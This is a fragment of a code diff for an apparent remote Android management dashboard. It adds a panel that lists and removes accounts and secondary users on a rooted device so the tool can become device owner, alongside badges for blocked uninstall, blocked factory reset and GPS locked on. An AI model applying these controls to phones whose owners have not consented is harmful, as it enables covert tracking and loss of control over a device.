+          el.style.borderColor = 'rgba(245, 158, 11, 0.45)';
+          el.style.color = '#fde68a';
+        } else if (bState.ok) {
+          el.style.background = 'rgba(16, 185, 129, 0.12)';
+          el.style.borderColor = 'rgba(16, 185, 129, 0.4)';
+          el.style.color = '#6ee7b7';
+        } else {
+          el.style.background = 'rgba(239, 68, 68, 0.12)';
+          el.style.borderColor = 'rgba(239, 68, 68, 0.4)';
+          el.style.color = '#fca5a5';
+        }
+        el.textContent = bState.text;
+      } else if (inv && inv.blockingReason) {
+        el.style.display = 'block';
+        el.style.background = 'rgba(245, 158, 11, 0.12)';
+        el.style.borderColor = 'rgba(245, 158, 11, 0.35)';
+        el.style.color = '#fde68a';
+        el.textContent = inv.blockingReason;
+      } else {
+        el.style.display = 'none';
+      }
+    });
+
+    if (softBtn) {
+      softBtn.style.display = (bState && bState.rebootRequired) ? 'inline-flex' : 'none';
+    }
+
+    if (tbody) {
+      if (!inv) {
+        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#94a3b8; padding:10px;">Click "Load Accounts" to inspect Google &amp; app accounts on this rooted device.</td></tr>';
+      } else if (!Array.isArray(inv.accounts) || inv.accounts.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#34d399; padding:10px;">✓ 0 accounts registered on device. Ready for Set Device Owner!</td></tr>';
+      } else {
+        tbody.innerHTML = inv.accounts.map((a, idx) => {
+          const typeBadge = a.isGoogle
+            ? '<span class="badge-mini danger">Google</span>'
+            : `<span class="badge-mini info">${escapeHtml(a.typeLabel || a.type)}</span>`;
+          return `
+            <tr>
+              <td style="font-weight:600; color:#f8fafc;">${escapeHtml(a.name)}</td>
+              <td>${typeBadge} <span style="font-size:0.62rem; color:#94a3b8;">(${escapeHtml(a.type)})</span></td>
+              <td style="font-size:0.68rem; color:#94a3b8;">User ${Number(a.userId || 0)}</td>
+              <td style="text-align:right;">
+                <button type="button" class="btn-ctrl compact btn-danger" onclick="removeDeviceAccountByIndex(${idx})">Remove</button>
+              </td>
+            </tr>`;
+        }).join('');
+      }
+    }
+
+    if (usersBox) {
+      if (inv && Array.isArray(inv.users) && inv.users.length > 0) {
+        const secUsers = inv.users.filter(u => !u.isPrimary && Number(u.userId) > 0);
+        if (secUsers.length > 0) {
+          usersBox.style.display = 'block';
+          usersBox.innerHTML = '<strong>Secondary Users / Profiles (may block dpm):</strong> ' + secUsers.map(u => `
+            <span class="badge-mini warning" style="display:inline-flex; align-items:center; gap:5px; margin:2px;">
+              ID ${u.userId}: ${escapeHtml(u.name || 'User')}
+              <button type="button" style="background:none; border:none; color:#f87171; cursor:pointer; padding:0; font-weight:800;" onclick="removeSecondaryUserCommand(${Number(u.userId)})">Remove</button>
+            </span>`).join(' ');
+        } else {
+          usersBox.style.display = 'none';
+          usersBox.innerHTML = '';
+        }
+      } else {
+        usersBox.style.display = 'none';
+        usersBox.innerHTML = '';
+      }
+    }
+  }
+
   function fetchInstalledAppsCommand() {
     const includeSystem = !!document.getElementById('chkIncludeSystemApps').checked;
     publishRemoteCommand('GET_PACKAGES', { includeSystem: includeSystem });
@@ -13256,6 +13670,7 @@
     updateMdmBadge('badgeMdmUninstall', !!(rest.uninstallBlocked !== undefined ? rest.uninstallBlocked : dev.uninstallBlocked), (rest.uninstallBlocked !== undefined ? rest.uninstallBlocked : dev.uninstallBlocked) ? 'Uninstall: BLOCKED' : 'Uninstall: ALLOWED');
     updateMdmBadge('badgeMdmReset', !!(rest.factoryResetBlocked !== undefined ? rest.factoryResetBlocked : dev.factoryResetBlocked), (rest.factoryResetBlocked !== undefined ? rest.factoryResetBlocked : dev.factoryResetBlocked) ? 'Reset: BLOCKED' : 'Reset: ALLOWED');
     updateMdmBadge('badgeMdmGps', !!(rest.gpsLockedOn !== undefined ? rest.gpsLockedOn : dev.gpsLockedOn), (rest.gpsLockedOn !== undefined ? rest.gpsLockedOn : dev.gpsLockedOn) ? 'GPS: LOCKED ON' : 'GPS: NORMAL');
+    if (typeof renderRootProvisioningCard === 'function') renderRootProvisioningCard();
   }
 
   // ==========================================
@@ -13304,6 +13719,7 @@
 
   function openGpsSettings() {
     syncLiveCommsToastSettingUi();
+    if (typeof renderRootProvisioningCard === 'function') renderRootProvisioningCard();
     const m = document.getElementById('gpsSettingsModal');
     if (m) m.style.display = 'flex';
   }
